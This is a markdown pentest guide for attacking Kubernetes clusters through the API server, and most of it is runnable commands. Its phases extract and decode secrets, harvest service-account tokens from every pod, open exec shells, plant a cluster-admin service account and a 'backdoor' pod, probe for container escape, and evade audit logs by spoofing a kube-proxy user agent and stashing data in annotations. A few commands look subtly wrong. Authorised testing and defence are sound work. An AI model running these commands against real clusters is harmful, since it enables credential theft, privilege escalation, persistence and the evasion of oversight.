# Kubernetes API Pentest Reference Guide ..beta..

## Complete API Resource Mapping, Almost

### Core API Group (`/api/v1`) - **Critical for Initial Access**
```
/api/v1/
├── namespaces/                          # Namespace discovery & isolation bypass
├── pods/                                # Container access & exec
├── services/                            # Service discovery & network mapping
├── endpoints/                           # Backend service enumeration
├── configmaps/                          # Configuration data (often credentials)
├── secrets/                             # HIGH VALUE - credentials, certs, tokens
├── persistentvolumes/                   # Persistent data access
├── persistentvolumeclaims/             # Storage claims & data access
├── serviceaccounts/                     # Identity & token sources
├── nodes/                               # Infrastructure enumeration
├── events/                              # Audit log information
└── limitranges/                         # Resource constraints (defense evasion)
```

### Apps API Group (`/apis/apps/v1`) - **Workload Intelligence**
```
/apis/apps/v1/
├── deployments/                         # Application architecture
├── replicasets/                         # Scaling & availability info
├── daemonsets/                          # Node-level services (often privileged)
└── statefulsets/                        # Persistent workloads (databases, etc.)
```

### RBAC API (`/apis/rbac.authorization.k8s.io/v1`) - **Privilege Mapping**
```
/apis/rbac.authorization.k8s.io/v1/
├── roles/                               # Namespace permissions
├── rolebindings/                        # Permission assignments
├── clusterroles/                        # Cluster-wide permissions
└── clusterrolebindings/                 # High-privilege assignments
```

### Security & Policy APIs - **Defense Analysis**
```
/apis/policy/v1/
├── poddisruptionbudgets/               # Availability constraints
└── podsecuritypolicies/                # Security policies (deprecated but still found)

/apis/networking.k8s.io/v1/
├── networkpolicies/                     # Network segmentation rules
└── ingresses/                           # External access points

/apis/security.openshift.io/v1/         # OpenShift-specific
├── securitycontextconstraints/         # Security constraints
└── rangeallocations/                    # UID/GID ranges
```

### Custom Resource APIs - **Environment-Specific**
```
/apis/{custom-group}/v1/
├── certificates/                        # Cert-manager resources
├── issuers/                            # Certificate authorities
├── prometheusrules/                     # Monitoring rules
└── {organization-specific}/             # Custom business logic
```

## Penetration Testing Methodology

### **Phase 1: Discovery & Enumeration**

#### ServiceAccount Token Acquisition
```bash
# From compromised pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# API server endpoints
APISERVER="https://kubernetes.default.svc.cluster.local"
# Alternative: https://10.43.0.1, https://kubernetes.default
```

#### Initial Reconnaissance
```bash
# Version discovery (CVE research)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/version

# Self-assessment (what can this token do?)
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "verb": "*",
        "resource": "*"
      }
    }
  }'

# Namespace enumeration
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces | jq '.items[].metadata.name'
```

### **Phase 2: Privilege Assessment**

#### RBAC Analysis
```bash
# Current ServiceAccount details
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/serviceaccounts/default

# Role enumeration
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/roles | jq '.items[].metadata.name'

# ClusterRole enumeration (high-value targets)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles | \
  jq '.items[] | select(.rules[].resources[] | contains("secrets", "pods/exec", "*"))'

# Find role bindings for current user
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/rolebindings | \
  jq '.items[] | select(.subjects[]?.name == "default")'
```

### **Phase 3: Secret & Credential Harvesting**

#### Secret Enumeration
```bash
# All secrets (if permitted)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets | jq '.items[].metadata | {name, namespace, type: .annotations."kubernetes.io/service-account.name"}'

# Target high-value namespaces
for ns in kube-system kube-public default monitoring prometheus grafana; do
  echo "=== $ns ==="
  curl -k -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/$ns/secrets 2>/dev/null | \
    jq -r '.items[]?.metadata.name // empty' | head -5
done

# Extract specific secrets
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets/{secret-name} | \
  jq '.data | to_entries[] | {key: .key, value: (.value | @base64d)}'
```

#### ConfigMap Analysis
```bash
# ConfigMaps often contain credentials
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/configmaps | \
  jq '.items[] | select(.data | to_entries[] | .value | test("password|token|key|secret"; "i"))'

# Database connections, API keys, etc.
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/{namespace}/configmaps/{configmap-name}
```

### **Phase 4: Lateral Movement & Escalation**

#### Pod Enumeration & Access
```bash
# Find pods with interesting capabilities
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/pods | \
  jq '.items[] | select(.spec.securityContext.privileged == true or .spec.hostNetwork == true or .spec.hostPID == true)'

# Execute commands (if permitted)
kubectl exec -it {pod-name} -n {namespace} -- /bin/bash
# Or via API:
curl -k -H "Authorization: Bearer $TOKEN" \
  -X POST "$APISERVER/api/v1/namespaces/{namespace}/pods/{pod}/exec?command=/bin/bash&stdin=true&stdout=true&tty=true" \
  --header "Connection: Upgrade" --header "Upgrade: SPDY/3.1"
```

#### Node & Infrastructure Access
```bash
# Node information (architecture, versions)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/nodes | \
  jq '.items[] | {name: .metadata.name, version: .status.nodeInfo.kubeletVersion, os: .status.nodeInfo.osImage}'

# Look for privileged DaemonSets
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/apps/v1/daemonsets | \
  jq '.items[] | select(.spec.template.spec.hostNetwork == true or .spec.template.spec.hostPID == true)'
```

## Advanced Attack Techniques

### **Token Theft & Impersonation**
```bash
# ServiceAccount token extraction from pods
for pod in $(kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{"\n"}{end}'); do
  ns=$(echo $pod | cut -d' ' -f1)
  name=$(echo $pod | cut -d' ' -f2)
  echo "=== $ns/$name ==="
  kubectl exec -n $ns $name -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50
done

# Test different tokens
curl -k -H "Authorization: Bearer $NEW_TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets
```

### **Persistence Techniques**
```bash
# Create privileged ServiceAccount
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ServiceAccount
metadata:
  name: pentest-sa
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pentest-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: pentest-sa
  namespace: kube-system
EOF

# Deploy backdoor pod
kubectl run backdoor --image=nginx --serviceaccount=pentest-sa --namespace=kube-system
```

### **Container Escape Techniques**
```bash
# Check for escape vectors
mount | grep docker
ls -la /var/run/docker.sock
capsh --print

# Host filesystem access
ls /host-root/
cat /host-root/etc/passwd

# cgroup escape attempt
echo $$ > /sys/fs/cgroup/memory/cgroup.procs
```

## Common Misconfigurations to Target

### **1. Overprivileged ServiceAccounts**
```bash
# Look for cluster-admin bindings
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
  jq '.items[] | select(.roleRef.name == "cluster-admin")'
```

### **2. Exposed Secrets**
```bash
# Secrets without proper RBAC
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets | \
  jq '.items[] | select(.metadata.name | contains("admin", "root", "master"))'
```

### **3. Privileged Pods**
```bash
# Pods with host access
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/pods | \
  jq '.items[] | select(.spec.hostNetwork or .spec.hostPID or .spec.securityContext.privileged)'
```

### **4. Network Policy Gaps**
```bash
# Check for network policies
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/networking.k8s.io/v1/networkpolicies

# No policies = no network segmentation
```

## Detection Evasion

### **Avoiding Audit Logs**
```bash
# Use different user agents
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "User-Agent: kube-proxy/v1.28.0" \
  $APISERVER/api/v1/secrets

# Throttle requests to avoid rate limiting alerts
sleep 5 && curl ...
```

### **Steganographic Techniques**
```bash
# Hide in legitimate-looking resources
kubectl create configmap system-config --from-literal="config.yaml=<base64_payload>"

# Use annotations for data exfiltration
kubectl annotate secret/target-secret pentest.io/extracted="<base64_data>"
```

##
##
